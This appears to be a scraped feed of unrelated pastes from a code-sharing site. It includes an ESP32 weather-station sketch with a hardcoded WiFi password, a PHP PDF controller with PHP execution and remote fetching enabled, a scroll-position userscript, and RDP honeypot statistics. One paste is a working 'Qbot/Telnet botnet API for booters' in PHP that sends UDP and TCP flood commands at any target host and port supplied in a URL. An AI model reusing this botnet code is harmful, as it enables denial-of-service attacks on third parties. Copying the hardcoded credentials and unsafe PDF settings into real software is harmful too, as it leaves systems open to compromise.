  char lightLvl[7];                                                           // Light intensity (to detect day or night)
} struct_wx;
struct_wx weather;

typedef struct struct_settings  {                                   // User Settings
  uint8_t screen_bright = 255;                                                // Screen brightness
  uint16_t updateDelay = 2500;                                                // Display time per page
  unsigned long mqttSendInterval = 5;                                         // MQTT transimission interval (minutes)
} struct_settings;
struct_settings user_settings;

// Global variables
String hostname = ""RedfieldWx"";                                               // WiFi hostname (11b)
char WifiSSID[33] = ""CF_Infrastructure"";                                      // STA mode WiFi SSID (33b)
char WifiPassword[64] = ""AccioNetwork"";                                       // STA mode WiFi Password (64b)


//IPAddress mqttBroker(192, 168, 50, 3);                                        // MQTT broker address
IPAddress mqttBroker(10, 0, 0, 2);                                            // MQTT broker address
uint16_t mqttPort = 1883;                                                     // MQTT broker port (2b)
char mqttBaseTopic[25] = ""RedfieldCrossing/"";                                 // MQTT base topic (9b)
char mqttCtrlTopic[33] = ""/cmd/"";                                             // MQTT control topic (33b)
char mqttDataTopic[33] = ""/tele/"";                                            // MQTT data topic (33b) = (307b total occupied for settings)

char* ntpLocal = ""192.168.50.3"";                                              // NTP server
char* ntpRemote = ""ca.pool.ntp.org"";                                          // Backup NTP server
int16_t gmtOffset_sec = -7 * 3600;                                            // NTP timezone offset in seconds
int16_t daylightOffset_sec = 3600;                                            // NTP daylight savings offset
struct tm ntpTime;                                                            // Most recent RTC time reading

byte flags = 0;                                                               // Flags variable (bitwise: 0=TFT on, 1=OLED on, 2-7=available)
unsigned long lastButtonTime = millis();

// Library interface objects
Adafruit_ADS1015 ads;                                                         // ADS1015 object (via I2C)
Adafruit_BME280 bme;                                                          // BME object (via I2C)
#ifdef OLEDDISPLAY
Adafruit_SSD1306 oled(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);        // OLED screen object (via I2C)
#endif
#ifdef TFTDISPLAY
//Adafruit_ST7735 tft = Adafruit_ST7735(pinCS, pinDC, pinRES);                  // TFT screen object (via SPI)
Adafruit_ST7735 tft = Adafruit_ST7735(pinCS, pinDC, pinMOSI, pinSCK, pinRES);
#endif
AsyncWebServer server(80);                                                    // Webserver object
OneWire oneWire(pinOneWire);                                                  // 1-wire bus object
DallasTemperature DS18B20(&oneWire);                                          // Dallas OneWire protocol sensors object
DateTime rtcTime;                                                             // RTC DateTime object
DeviceAddress ds18Addr;                                                       // DS18B20 1-wire address object
#ifdef DS3231_RTC
RTC_DS3231 rtc;                                                               // DS3231 RTC object (via I2C)
#endif
#ifdef DS1307_RTC
RTC_DS1307 rtc;                                                               // DS1307 RTC object (via I2C)
#endif
Preferences preferences;                                                      // Preferences object for saved settings
WiFiClient WxWiFiClient;                                                      // WiFi client object
PubSubClient MQTTClient(WxWiFiClient);                                        // MQTT client object"
sbJn8Tcb,Controller Asrama,Frahman,PHP,Friday 23rd of February 2024 09:37:55 PM CDT,"public function generatePDF()
    {
        $siswa = $this->AsramaModel->getData();
        $setting = $this->AdminModel->getAll();
        $data = [
            'title' => 'Biodata Siswa',
            'setting' => $this->AdminModel->getAll(),
            'row' => $this->TahunAjaranModel->getAktif(),
            'jalur' => $this->JalurModel->getAktif(),
            'siswa' => $this->AsramaModel->getData(),
            'prestasi' => $this->DetailPrestasiModel->getAll_detail_prestasi(),
            'foto_siswa' => $this->getImageDataFromDatabase(),
        ];
        // Load Dompdf options
        $options = new Options();
        $options->set('isPhpEnabled', true); // Aktifkan PHP
        $options->set('isHtml5ParserEnabled', true); // Aktifkan parser HTML5
        $options->set('isRemoteEnabled', true); // Aktifkan akses URL eksternal

        // Instantiate Dompdf class with options
        $dompdf = new Dompdf($options);

        // Load HTML content from view
        $viewContent = view('siswa/asrama/coba', $data);

        // Load HTML into Dompdf
        $dompdf->loadHtml($viewContent);

        // Set paper size and orientation
        $dompdf->setPaper('A4', 'portrait');


        // Render PDF
        $dompdf->render();

        // Output PDF to browser
        $dompdf->stream(""example.pdf"", array(""Attachment"" => false));
    }"
9Bxy9UTL,Preferences problem,Silverfire9,Arduino,Friday 23rd of February 2024 09:37:10 PM CDT,"void prefSave()  {                                                            // Save settings to NVM
  String strBuf;
  int IPBuf[4];

  Serial.println(""Saving preferences:"");

  Serial.println(""     User settings..."");
  #ifdef PREFSDEBUG
  Serial.print(""          Screen brightness: ""); Serial.println(user_settings.screen_bright);
  Serial.print(""          Info page display time: ""); Serial.println(user_settings.updateDelay);
  Serial.print(""          MQTT publishing rate: ""); Serial.println(user_settings.mqttSendInterval);
  #endif
  preferences.begin(""prefsUser"", false);
  preferences.putUChar(""Brightness"", user_settings.screen_bright);     // Screen brightness (1b)
  preferences.putUInt(""PageTime"", user_settings.updateDelay);          // Display time per page (2b)
  preferences.putULong(""MQTTTime"", user_settings.mqttSendInterval);    // // MQTT transimission interval (minutes) (4b)
  preferences.end();
  Serial.println(""     Saved."");

  Serial.println(""     WiFi settings..."");
  #ifdef PREFSDEBUG
  Serial.print(""          ESP hostname: ""); Serial.println(hostname);
  Serial.print(""          WiFi SSID (STA mode): ""); Serial.println(WifiSSID);
  Serial.print(""          WiFi password (STA mode): ""); Serial.println(WifiPassword);
  #endif
  preferences.begin(""prefsWiFi"", false);
  preferences.putString(""hostname"", hostname);
  preferences.putString(""WifiSSID"", String(WifiSSID));                 // STA mode WiFi SSID (33b)
  preferences.putString(""WifiPassword"", String(WifiPassword));         // STA mode WiFi Password (64b)
  preferences.end();
  Serial.println(""     Saved."");

  Serial.println(""     MQTT settings..."");
  #ifdef PREFSDEBUG
  Serial.print(""          MQTT broker IP address: ""); Serial.println(mqttBroker);
  Serial.print(""          MQTT broker port: ""); Serial.println(mqttPort);
  Serial.print(""          MQTT base topic: ""); Serial.println(mqttBaseTopic);  
  Serial.print(""          MQTT control subtopic: ""); Serial.println(mqttCtrlTopic);
  Serial.print(""          MQTT data subtopic: ""); Serial.println(mqttDataTopic);
  #endif
  preferences.begin(""prefsMQTT"", false);
  preferences.putUInt(""MQTTAddress"", mqttBroker);                      // MQTT broker address (4b)
  preferences.putUShort(""MQTTPort"", mqttPort);                         // MQTT broker port
  preferences.putString(""MQTTBaseTopic"", String(mqttBaseTopic));       // MQTT base topic
  preferences.putString(""MQTTCtrlTopic"", String(mqttCtrlTopic));       // MQTT control topic
  preferences.putString(""MQTTDataTopic"", String(mqttDataTopic));       // MQTT data topic
  preferences.end();
  Serial.println(""     Saved."");

  Serial.println(""     Sensor calibration settings..."");
  #ifdef PREFSDEBUG
  Serial.print(""          DS18B20 simple offset: ""); Serial.println(calibrations.ds18CalOffset);
  Serial.print(""          DS18B20 boiling water reading: ""); Serial.println(calibrations.ds18RawHi);
  Serial.print(""          DS18B20 frozen water reading: ""); Serial.println(calibrations.ds18RawLo);
  Serial.print(""          Calculated boiling point: ""); Serial.println(calibrations.ds18RefHi);
  Serial.print(""          Calculated freezing poin: ""); Serial.println(calibrations.ds18RefLo);
  Serial.print(""          Reed switch debounce time: ""); Serial.println(calibrations.reedDebounceTime);
  Serial.print(""          Photoresistor light/dark threshold: ""); Serial.println(calibrations.luxThreshold);
  Serial.print(""          Photoresistor hysteresis: ""); Serial.println(calibrations.luxHysteresis);
  #endif
  preferences.begin(""prefsCal"", false);
  preferences.putFloat(""dsOffCal"", calibrations.ds18CalOffset);                            // DS18B20 offset value (1-point calibration)
  preferences.putFloat(""dsRawH"", calibrations.ds18RawHi);                                  // DS18B20 calibration boiling water reading (2-point calibration)
  preferences.putFloat(""dsRawL"", calibrations.ds18RawLo);                                  // DS18B20 temperature frozen water reading (2-point calibration)
  preferences.putFloat(""dsRefH"", calibrations.ds18RefHi);                                  // DS18B20 temperature boiling water actual (2-point calibration)
  preferences.putFloat(""dsRefL"", calibrations.ds18RefLo);                                  // DS18B20 temperature frozen water actual (2-point calibration)
  preferences.putChar(""debounce"", calibrations.reedDebounceTime);                          // Reed switch debouncing time in ms
  preferences.putUShort(""luxTh"", calibrations.luxThreshold);                               // Photoresistor day/night threshold
  preferences.putUShort(""luxHys"", calibrations.luxHysteresis);                             // Photoresistor threshold hysteresis
  preferences.end();
  Serial.println(""     Saved."");

  Serial.println(""All Settings saved.\n"");
}

void prefLoad()  {                                                            // Load settings from NVM
  byte charBuf;
  int intBuf;
  String strBuf;
  int IPBuf[4];

  preferences.begin(""prefsUser"", true);
  Serial.println(""Checking for saved settings..."");
  if (preferences.isKey(""Brightness"")==1)  {
    Serial.println(""Saved settings found."");
    #ifdef PREFSDEBUG
    Serial.println(""Settings before loading:"");
    Serial.print(""     Screen brightness: ""); Serial.println(user_settings.screen_bright);
    Serial.print(""     Info page display time: ""); Serial.println(user_settings.updateDelay);
    Serial.print(""     MQTT publishing rate: ""); Serial.println(user_settings.mqttSendInterval);
    Serial.print(""     ESP hostname: ""); Serial.println(hostname);
    Serial.print(""     WiFi SSID (STA mode): ""); Serial.println(WifiSSID);
    Serial.print(""     WiFi password (STA mode): ""); Serial.println(WifiPassword);
    Serial.print(""     MQTT broker IP address: ""); Serial.println(mqttBroker);
    Serial.print(""     MQTT broker port: ""); Serial.println(mqttPort);
    Serial.print(""     MQTT base topic: ""); Serial.println(mqttBaseTopic);  
    Serial.print(""     MQTT control subtopic: ""); Serial.println(mqttCtrlTopic);
    Serial.print(""     MQTT data subtopic: ""); Serial.println(mqttDataTopic);
    Serial.print(""     DS18B20 simple offset: ""); Serial.println(calibrations.ds18CalOffset);
    Serial.print(""     DS18B20 boiling water reading: ""); Serial.println(calibrations.ds18RawHi);
    Serial.print(""     DS18B20 frozen water reading: ""); Serial.println(calibrations.ds18RawLo);
    Serial.print(""     Calculated boiling point: ""); Serial.println(calibrations.ds18RefHi);
    Serial.print(""     Calculated freezing poin: ""); Serial.println(calibrations.ds18RefLo);
    Serial.print(""     Reed switch debounce time: ""); Serial.println(calibrations.reedDebounceTime);
    Serial.print(""     Photoresistor light/dark threshold: ""); Serial.println(calibrations.luxThreshold);
    Serial.print(""     Photoresistor hysteresis: ""); Serial.println(calibrations.luxHysteresis);
    #endif
    Serial.print(""Loading settings..."");
    user_settings.screen_bright = preferences.getUChar(""Brightness"", 255);     // Screen brightness (1b)
    user_settings.updateDelay = preferences.getUInt(""PageTime"", 2500); // Display time per page
    user_settings.mqttSendInterval = preferences.getULong(""MQTTTime"", (15*60*1000));    // // MQTT transimission interval (minutes) (4b)
    preferences.end();

    preferences.begin(""prefsWiFi"", true);
    hostname = preferences.getString(""hostname"");
    strBuf = preferences.getString(""WifiSSID"");                                 // WiFi SSID (33b)
    strBuf.toCharArray(WifiSSID, 33);
    strBuf = preferences.getString(""WifiPassword"");                             // WiFi Password (64b)
    strBuf.toCharArray(WifiPassword, 64);
    preferences.end();

    preferences.begin(""prefsMQTT"", true);
    mqttBroker = preferences.getUInt(""MQTTAddress"");                            // MQTT broker address
    mqttPort = preferences.getUShort(""MQTTPort"", 1883);                         // MQTT broker port
    strBuf = preferences.getString(""mqttBaseTopic"");
    Serial.println(strBuf);
    strBuf.toCharArray(mqttBaseTopic, 25);                                      // MQTT base topic
    Serial.println(mqttBaseTopic);
    strBuf = preferences.getString(""MQTTCtrlTopic"");
    strBuf.toCharArray(mqttCtrlTopic, 33);                                      // MQTT control topic
    strBuf = preferences.getString(""MQTTDataTopic"");
    strBuf.toCharArray(mqttDataTopic, 33);                                      // MQTT data topic
    preferences.end();

    preferences.begin(""prefsCal"", true);
    calibrations.ds18CalOffset = preferences.getFloat(""dsOffCal"", 0.0);         // DS18B20 offset value (1-point calibration)
    calibrations.ds18RawHi = preferences.getFloat(""dsRawH"", 100.0);             // DS18B20 calibration boiling water reading
    calibrations.ds18RawLo = preferences.getFloat(""dsRawL"", 0.0);               // DS18B20 calibration frozen water reading
    calibrations.ds18RefHi = preferences.getFloat(""dsRefH"", 100.0);             // DS18B20 calibration boiling water actual
    calibrations.ds18RefLo = preferences.getFloat(""dsRefL"", 0.0);               // DS18B20 calibration frozen water actual
    calibrations.reedDebounceTime = preferences.getUChar(""debounce"", 150);      // Reed switch debouncing time in ms
    calibrations.luxThreshold = preferences.getUShort(""luxTh"", 2048);           // Photoresistor day/night threshold
    calibrations.luxHysteresis = preferences.getUShort(""luxHys"", 512);          // Photoresistor threshold hysteresis
    preferences.end();
    Serial.println("" Loaded."");
  }
  else {
    preferences.end();
    Serial.print(""Saved settings not found. "");
    prefSave();
  }
  #ifdef PREFSDEBUG
  Serial.println(""Settings being used:"");
    Serial.print(""     Screen brightness: ""); Serial.println(user_settings.screen_bright);
    Serial.print(""     Info page display time: ""); Serial.println(user_settings.updateDelay);
    Serial.print(""     MQTT publishing rate: ""); Serial.println(user_settings.mqttSendInterval);
    Serial.print(""     ESP hostname: ""); Serial.println(hostname);
    Serial.print(""     WiFi SSID (STA mode): ""); Serial.println(WifiSSID);
    Serial.print(""     WiFi password (STA mode): ""); Serial.println(WifiPassword);
    Serial.print(""     MQTT broker IP address: ""); Serial.println(mqttBroker);
    Serial.print(""     MQTT broker port: ""); Serial.println(mqttPort);
    Serial.print(""     MQTT base topic: ""); Serial.println(mqttBaseTopic);  
    Serial.print(""     MQTT control subtopic: ""); Serial.println(mqttCtrlTopic);
    Serial.print(""     MQTT data subtopic: ""); Serial.println(mqttDataTopic);
    Serial.print(""     DS18B20 simple offset: ""); Serial.println(calibrations.ds18CalOffset);
    Serial.print(""     DS18B20 boiling water reading: ""); Serial.println(calibrations.ds18RawHi);
    Serial.print(""     DS18B20 frozen water reading: ""); Serial.println(calibrations.ds18RawLo);
    Serial.print(""     Calculated boiling point: ""); Serial.println(calibrations.ds18RefHi);
    Serial.print(""     Calculated freezing poin: ""); Serial.println(calibrations.ds18RefLo);
    Serial.print(""     Reed switch debounce time: ""); Serial.println(calibrations.reedDebounceTime);
    Serial.print(""     Photoresistor light/dark threshold: ""); Serial.println(calibrations.luxThreshold);
    Serial.print(""     Photoresistor hysteresis: ""); Serial.println(calibrations.luxHysteresis);
  #endif
}"
X20LHh3A,邀您一起看：出错[2],xiaomianao666,JavaScript,Friday 23rd of February 2024 08:45:55 PM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥出错[2]@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5oiR55qE5Li76aG1XCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eVwiLFwiY29sX3R5cGVcIjpcIng1X3dlYnZpZXdfc2luZ2xlXCIsXCJmaW5kX3J1bGVcIjpcImpzOnNldFJlc3VsdChbe1xcbiAgICB1cmw6XFxcImZpbGU6Ly8vc3RvcmFnZS9lbXVsYXRlZC8wL0FuZHJvaWQvZGF0YS9jb20uZXhhbXBsZS5oaWtlcnZpZXcvZmlsZXMvRG9jdW1lbnRzL25ld1BsYW5Ib21lLmh0bWwjbm9SZWNvcmRIaXN0b3J5I1xcXCIsXFxuZGVzYzpcXFwiMTAwJSYmZmxvYXRcXFwiLFxcbmV4dHJhOntjYW5CYWNrOiB0cnVlfVxcbn1dKTtcIixcImdyb3VwXCI6XCLikaDmjqjojZBcIn0iLCJ0aXRsZSI6IuWHuumUmVsyXSJ9
eHVSbexD,Mad,Unknown_No_1,PHP,Friday 23rd of February 2024 08:39:52 PM CDT,KalpoHatersByMadHacker
jDF83qHf,remember-page-scroll-position.user.js,jcunews,JavaScript,Friday 23rd of February 2024 07:17:37 PM CDT,"// ==UserScript==
// @name         Remember page scroll position
// @namespace    https://greasyfork.org/en/users/85671-jcunews
// @version      1.0.1
// @license      AGPL v3
// @author       jcunews
// @description  Context: https://www.reddit.com/r/userscripts/comments/1ayfnoh/add_scroll_position_to_url_is_this_possible/
// @match        *://*/*
// @include      *:*
// @grant        GM_getValue
// @grant        GM_setValue
// ==/UserScript==

//Note: Scroll position applies to page only. Not elements within page. i.e. doesn't apply to scroll position of element content. Only the page.

(() => {
  //=== CONFIG BEGIN
  var delayBeforeApplyPagePosition = 500; //in milliseconds. 1 second = 1000ms. since last change to page height and position.
  var delayBeforeSavePagePosition  = 500; //in milliseconds. 1 second = 1000ms. since last change to page position.
  var maxDaysToKeepSavedPositions  = 30;  //since last update to saved page position.
  //=== CONFIG END

  var pageHeight, posX, posY, timestamp, timer;
  function savePos(recs, rec) {
    recs = GM_getValue(""records"", {});
    rec = recs[location.href] = recs[location.href] || {};
    rec.x = scrollX;
    rec.y = scrollY;
    rec.ts = Date.now();
    Object.keys(recs).forEach(k => {
      if ((Date.now() - recs[k].ts) >= maxDaysToKeepSavedPositions*24*60*60*1000) delete recs[k]
    });
    GM_setValue(""records"", recs)
  }
  pageHeight = document.body.scrollHeight;
  posX = scrollX;
  posY = scrollY;
  timestamp = Date.now();
  (function checkPage(rec) {
    if ((document.body.scrollHeight !== pageHeight) || (document.body.scrollLeft !== scrollX) || (document.body.scrollTop !== scrollY)) {
      pageHeight = document.body.scrollHeight;
      posX = scrollX;
      posY = scrollY;
      timestamp = Date.now()
    } else if ((Date.now() - timestamp) >= delayBeforeApplyPagePosition) {
      addEventListener(""beforeunload"", savePos);
      addEventListener(""blur"", savePos);
      addEventListener(""focus"", savePos);
      addEventListener(""scroll"", () => {
        clearTimeout(timer);
        timer = setTimeout(savePos, delayBeforeSavePagePosition)
      });
      if (rec = GM_getValue(""records"", {})[location.href]) scrollTo(rec.x, rec.y);
      return
    }
    setTimeout(checkPage, 100)
  })()
})()
"
hLuysSiP,QBOT / TELNET API,bootssads,PHP,Friday 23rd of February 2024 07:12:22 PM CDT,"// WORKING TELNET/QBOT BOTNET API FOR BOOTERS.

<?php

        $attackMethods = array(""UDP"", ""SYN"", ""FIN"", ""ACK"", ""RST"", ""PSH"");
        function htmlsc($string)
        {
        return htmlspecialchars($string, ENT_QUOTES, ""UTF-8"");
        }
        if (!isset($_GET[""key""]) || !isset($_GET[""host""]) || !isset($_GET[""port""]) || !isset($_GET[""method""]) || !isset($_GET[""time""]))
        die(""<p>You are missing a parameter"");
        $key = htmlsc($_GET[""key""]);
        $host = htmlsc($_GET[""host""]);
        $port = htmlsc($_GET[""port""]);
        $method = htmlsc(strtoupper($_GET[""method""]));
        $time = htmlsc($_GET[""time""]);
        $command = """";
        if (!in_array($key, $APIKeys)) die(""Invalid API key"");
        if (!in_array($method, $attackMethods)) die(""Invalid attack method"");
        if ($method == ""UDP"") $command = ""!* UDP $host $port $time 32 1337 1\n"";
        else if ($method == ""SYN"") $command = ""!* TCP $host $port $time 32 syn 10 1\n"";
        else if ($method == ""FIN"") $command = ""!* TCP $host $port $time 32 fin 10 1\n"";
        else if ($method == ""ACK"") $command = ""!* TCP $host $port $time 32 ack 10 1\n"";
        else if ($method == ""RST"") $command = ""!* TCP $host $port $time 32 rst 10 1\n"";
        else if ($method == ""PSH"") $command = ""!* TCP $host $port $time 32 psh 10 1\n"";

        ($socket ? null : die(""<p>Failed to connect""));


        fwrite($socket, $command . ""\n"");
        fclose($socket);
        echo ""Attack sent to $host:$port for $time seconds using method $method!\n"";

//API: 1.1.1.1/x.php?key=YOURFUCKINGKEY&host=[host]&port=[port]&method=[method]&time=[time]
//exp: 1.1.1.1/x.php?key=YOURFUCKINGKEY&host=8.8.8.8&port=80&method=udp&time=100

?>"
AfbKuiET,2024-02-23_stats.json,rdp_snitch,JSON,Friday 23rd of February 2024 06:18:33 PM CDT,"{
  ""ip"": {
    ""147.182.129.134"": 12,
    ""172.104.208.93"": 3,
    ""194.165.16.10"": 6,
    ""64.23.189.251"": 6,
    ""45.227.254.48"": 6,
    ""205.210.31.110"": 9,
    ""62.204.41.107"": 18,
    ""162.142.125.216"": 3,
    ""179.60.147.129"": 3,
    ""78.24.205.142"": 3,
    ""167.94.145.55"": 3,
    ""205.210.31.72"": 9,
    ""87.251.75.145"": 6,
    ""185.170.144.3"": 3,
    ""58.218.204.183"": 9,
    ""137.27.236.90"": 3,
    ""36.91.222.100"": 6,
    ""123.56.20.194"": 6,
    ""118.193.36.56"": 3,
    ""45.227.254.8"": 12,
    ""198.235.24.64"": 9,
    ""45.135.232.19"": 3,
    ""120.240.145.8"": 3,
    ""27.184.195.229"": 3,
    ""194.169.175.21"": 3,
    ""87.251.75.64"": 3,
    ""143.110.172.155"": 6,
    ""216.24.210.142"": 3,
    ""213.109.202.232"": 9,
    ""198.235.24.155"": 9
  },
  ""asn"": {
    ""AS14061"": 24,
    ""AS63949"": 3,
    ""AS48721"": 6,
    ""AS267784"": 18,
    ""AS396982"": 36,
    ""AS59425"": 18,
    ""AS398324"": 3,
    ""AS209588"": 3,
    ""AS400810"": 3,
    ""AS398705"": 3,
    ""AS208091"": 9,
    ""AS197414"": 3,
    ""AS4134"": 12,
    ""AS20115"": 3,
    ""AS7713"": 6,
    ""AS37963"": 6,
    ""AS135377"": 3,
    ""AS198953"": 3,
    ""AS56040"": 3,
    ""AS209605"": 3,
    ""AS62240"": 3,
    ""AS208312"": 9
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 24,
    ""Akamai Technologies"": 3,
    ""Flyservers S.A."": 27,
    ""Google LLC"": 36,
    ""Horizon LLC"": 18,
    ""Censys, Inc."": 6,
    ""BreezeHost"": 3,
    ""Xhost Internet Solutions LP"": 12,
    ""Chinanet"": 12,
    ""Charter Communications"": 3,
    ""PT Telekomunikasi Indonesia"": 6,
    ""Hangzhou Alibaba Advertising Co"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Proton66 OOO"": 3,
    ""China Mobile communications corporation"": 3,
    ""UAB Host Baltic"": 3,
    ""Clouvider Limited"": 3,
    ""Red Byte LLC"": 9
  },
  ""org"": {
    ""DigitalOcean, LLC"": 24,
    ""Linode"": 3,
    ""Flyservers S.A"": 6,
    ""UAB Host Baltic"": 18,
    ""Palo Alto Networks, Inc"": 36,
    ""Horizon LLC"": 18,
    ""Censys Inc"": 3,
    ""Cloud Solutions S.A"": 3,
    ""Abr Tose'eh Darya Group Company PJSC"": 3,
    ""Censys, Inc."": 3,
    ""Xhost Internet Solutions"": 9,
    ""Xhostis"": 3,
    ""Chinanet JS"": 9,
    ""Spectrum"": 3,
    ""Telekomunikasi Indonesia"": 6,
    ""Aliyun Computing Co., LTD"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Proton66 LLC"": 3,
    ""China Mobile"": 3,
    ""Chinanet HE"": 3,
    ""EmanuelHosting LTD"": 3,
    ""IPXO"": 3,
    ""Chang Way Technologies Co. Limited"": 9
  },
  ""regionName"": {
    ""New Jersey"": 15,
    ""Kaunas"": 9,
    ""California"": 48,
    ""Vilnius"": 18,
    ""Moscow"": 30,
    ""Michigan"": 3,
    ""Distrito Federal"": 3,
    ""Texas"": 3,
    ""Hesse"": 3,
    ""North Holland"": 12,
    ""Jiangsu"": 9,
    ""Jakarta"": 6,
    ""Beijing"": 6,
    ""Kowloon"": 3,
    ""Guangdong"": 3,
    ""Hebei"": 3,
    ""England"": 6
  },
  ""country"": {
    ""United States"": 69,
    ""Lithuania"": 27,
    ""Russia"": 30,
    ""Venezuela"": 3,
    ""Germany"": 3,
    ""The Netherlands"": 12,
    ""China"": 21,
    ""Indonesia"": 6,
    ""Hong Kong"": 3,
    ""United Kingdom"": 6
  },
  ""account"": {
    ""x7bupyia"": 12,
    ""beio"": 3,
    ""Test"": 36,
    ""hello"": 33,
    ""gmBXMTwAH"": 3,
    ""XVFGVA"": 3,
    ""UfXLmz"": 3,
    ""(empty)"": 15,
    ""Administr"": 21,
    ""yGQokHzFL"": 3,
    ""ypNUTy"": 3,
    ""pnRaCk"": 3,
    ""Administrator"": 3,
    ""nGyQGpfHN"": 3,
    ""VXNnRe"": 3,
    ""FEGaDZ"": 3,
    ""Domain"": 21,
    ""rgzgSwLHx"": 3,
    ""pkGMCc"": 3,
    ""eIkKqG"": 3
  },
  ""keyboard"": {
    ""Unknown"": 180
  },
  ""client_build"": {
    ""Unknown"": 180
  },
  ""client_name"": {
    ""Unknown"": 180
  },
  ""ip_type"": {
    ""hosting"": 72,
    ""Unknown"": 102,
    ""mobile"": 3,
    ""mobile & hosting & proxy"": 3
  }
}"
VVTxDRdD,2024-02-23_stats.json,rdp_snitch,JSON,Friday 23rd of February 2024 06:16:17 PM CDT,"{
  ""ip"": {
    ""147.182.129.134"": 8,
    ""172.104.208.93"": 2,
    ""194.165.16.10"": 4,
    ""64.23.189.251"": 4,
    ""45.227.254.48"": 4,
    ""205.210.31.110"": 6,
    ""62.204.41.107"": 12,
    ""162.142.125.216"": 2,
    ""179.60.147.129"": 2,
    ""78.24.205.142"": 2,
    ""167.94.145.55"": 2,
    ""205.210.31.72"": 6,
    ""87.251.75.145"": 4,
    ""185.170.144.3"": 2,
    ""58.218.204.183"": 6,
    ""137.27.236.90"": 2,
    ""36.91.222.100"": 4,
    ""123.56.20.194"": 4,
    ""118.193.36.56"": 2,
    ""45.227.254.8"": 8,
    ""198.235.24.64"": 6,
    ""45.135.232.19"": 2,
    ""120.240.145.8"": 2,
    ""27.184.195.229"": 2,
    ""194.169.175.21"": 2,
    ""87.251.75.64"": 2,
    ""143.110.172.155"": 4,
    ""216.24.210.142"": 2,
    ""213.109.202.232"": 6,
    ""198.235.24.155"": 6
  },
  ""asn"": {
    ""AS14061"": 16,
    ""AS63949"": 2,
    ""AS48721"": 4,
    ""AS267784"": 12,
    ""AS396982"": 24,
    ""AS59425"": 12,
    ""AS398324"": 2,
    ""AS209588"": 2,
    ""AS400810"": 2,
    ""AS398705"": 2,
    ""AS208091"": 6,
    ""AS197414"": 2,
    ""AS4134"": 8,
    ""AS20115"": 2,
    ""AS7713"": 4,
    ""AS37963"": 4,
    ""AS135377"": 2,
    ""AS198953"": 2,
    ""AS56040"": 2,
    ""AS209605"": 2,
    ""AS62240"": 2,
    ""AS208312"": 6
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 16,
    ""Akamai Technologies"": 2,
    ""Flyservers S.A."": 18,
    ""Google LLC"": 24,
    ""Horizon LLC"": 12,
    ""Censys, Inc."": 4,
    ""BreezeHost"": 2,
    ""Xhost Internet Solutions LP"": 8,
    ""Chinanet"": 8,
    ""Charter Communications"": 2,
    ""PT Telekomunikasi Indonesia"": 4,
    ""Hangzhou Alibaba Advertising Co"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Proton66 OOO"": 2,
    ""China Mobile communications corporation"": 2,
    ""UAB Host Baltic"": 2,
    ""Clouvider Limited"": 2,
    ""Red Byte LLC"": 6
  },
  ""org"": {
    ""DigitalOcean, LLC"": 16,
    ""Linode"": 2,
    ""Flyservers S.A"": 4,
    ""UAB Host Baltic"": 12,
    ""Palo Alto Networks, Inc"": 24,
    ""Horizon LLC"": 12,
    ""Censys Inc"": 2,
    ""Cloud Solutions S.A"": 2,
    ""Abr Tose'eh Darya Group Company PJSC"": 2,
    ""Censys, Inc."": 2,
    ""Xhost Internet Solutions"": 6,
    ""Xhostis"": 2,
    ""Chinanet JS"": 6,
    ""Spectrum"": 2,
    ""Telekomunikasi Indonesia"": 4,
    ""Aliyun Computing Co., LTD"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Proton66 LLC"": 2,
    ""China Mobile"": 2,
    ""Chinanet HE"": 2,
    ""EmanuelHosting LTD"": 2,
    ""IPXO"": 2,
    ""Chang Way Technologies Co. Limited"": 6
  },
  ""regionName"": {
    ""New Jersey"": 10,
    ""Kaunas"": 6,
    ""California"": 32,
    ""Vilnius"": 12,
    ""Moscow"": 20,
    ""Michigan"": 2,
    ""Distrito Federal"": 2,
    ""Texas"": 2,
    ""Hesse"": 2,
    ""North Holland"": 8,
    ""Jiangsu"": 6,
    ""Jakarta"": 4,
    ""Beijing"": 4,
    ""Kowloon"": 2,
    ""Guangdong"": 2,
    ""Hebei"": 2,
    ""England"": 4
  },
  ""country"": {
    ""United States"": 46,
    ""Lithuania"": 18,
    ""Russia"": 20,
    ""Venezuela"": 2,
    ""Germany"": 2,
    ""The Netherlands"": 8,
    ""China"": 14,
    ""Indonesia"": 4,
    ""Hong Kong"": 2,
    ""United Kingdom"": 4
  },
  ""account"": {
    ""x7bupyia"": 8,
    ""beio"": 2,
    ""Test"": 24,
    ""hello"": 22,
    ""gmBXMTwAH"": 2,
    ""XVFGVA"": 2,
    ""UfXLmz"": 2,
    ""(empty)"": 10,
    ""Administr"": 14,
    ""yGQokHzFL"": 2,
    ""ypNUTy"": 2,
    ""pnRaCk"": 2,
    ""Administrator"": 2,
    ""nGyQGpfHN"": 2,
    ""VXNnRe"": 2,
    ""FEGaDZ"": 2,
    ""Domain"": 14,
    ""rgzgSwLHx"": 2,
    ""pkGMCc"": 2,
    ""eIkKqG"": 2
  },
  ""keyboard"": {
    ""Unknown"": 120
  },
  ""client_build"": {
    ""Unknown"": 120
  },
  ""client_name"": {
    ""Unknown"": 120
  },
  ""ip_type"": {
    ""hosting"": 48,
    ""Unknown"": 68,
    ""mobile"": 2,
    ""mobile & hosting & proxy"": 2
  }
}"
bC3ivJr5,2024-02-23_stats.json,rdp_snitch,JSON,Friday 23rd of February 2024 06:15:09 PM CDT,"{
  ""ip"": {
    ""147.182.129.134"": 4,
